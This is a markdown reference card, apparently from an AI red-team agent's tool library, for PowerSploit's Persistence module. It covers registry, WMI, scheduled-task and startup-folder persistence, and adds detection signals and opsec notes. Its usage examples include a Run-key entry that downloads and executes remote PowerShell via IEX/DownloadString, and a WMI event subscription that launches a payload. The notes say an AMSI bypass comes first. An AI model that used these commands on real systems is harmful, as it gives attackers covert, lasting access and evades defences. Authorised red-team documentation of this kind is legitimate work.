---
name: PowerSploit Persistence
category: persistence
subcategories: [wmi-persistence, registry-persistence, scheduled-task, userland-persistence]
tradecraft_tags: [persistence, powershell, wmi, registry, scheduled-task, powersploit, invoke-persistence]
mitre_attack:
  - id: T1547.001
    name: Boot or Logon Autostart Execution — Registry Run Keys / Startup Folder
  - id: T1546.003
    name: Event Triggered Execution — Windows Management Instrumentation Event Subscription
source:
  url: https://github.com/PowerShellMafia/PowerSploit/tree/master/Persistence
  license: BSD-3-Clause
  maintained: false
binary_type: powershell-script
binary_filename: Persistence.psm1
supported_os: [windows]
architecture: [x64, x86]
privilege_required: user
network_required: false
detection_signal: |
  Same signals as SharPersist — registry writes, scheduled task creation, WMI event
  subscriptions. PowerShell persistence module loading (Event 4104, script block logging).
  AMSI must be bypassed first.
usage_examples:
  - description: Add a registry Run key persistence
    args: "Add-Persistence -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://...')} -PersistenceMethod Registry -PersistenceType CurrentUserRegistryEntry"
  - description: Add WMI event subscription persistence (admin required)
    args: "Add-Persistence -FilePath C:\\Windows\\Temp\\payload.ps1 -PersistenceMethod WMI -WMIMethod Subscription"
  - description: Clean up persistence
    args: "Remove-Persistence -PersistenceMethod Registry"
opsec_notes: |
  PowerSploit Persistence module requires AMSI bypass first. SharPersist (.NET assembly)
  is preferred for Apollo engagements — no PowerShell overhead. PowerSploit is archived
  and unmaintained; use SharPersist for maintained persistence toolkit functionality.
gotchas: |
  Archived/unmaintained. AMSI will flag the function names if not bypassed. SharPersist
  provides equivalent functionality as a .NET assembly. Use for reference only; SharPersist
  for production use.
related_ttps: [sharpersist, seatbelt, sharpup]
alternatives: [sharpersist]
common_args:
  Add-Persistence:
    description: Add a persistence mechanism
    typical_values: [flag-only]
  Remove-Persistence:
    description: Remove a persistence mechanism
    typical_values: [flag-only]
  -PersistenceMethod:
    description: Persistence type to use
    typical_values: [Registry, WMI, ScheduledTask, StartupFolder]
last_updated: 2026-05-29
---

# PowerSploit Persistence

The persistence module from PowerSploit — the predecessor to SharPersist's PowerShell
implementation. Provides `Add-Persistence` and `Remove-Persistence` cmdlets for registry,
WMI, scheduled task, and startup folder persistence. Documented for reference; SharPersist
is the maintained .NET equivalent for Apollo engagements.

## Typical use cases
- PowerShell-based persistence as a fallback when SharPersist is unavailable

## How Sage uses this
Reference only. SharPersist is the preferred persistence toolkit for Apollo engagements.
Use PowerSploit Persistence only when specifically needed or as a historical reference.
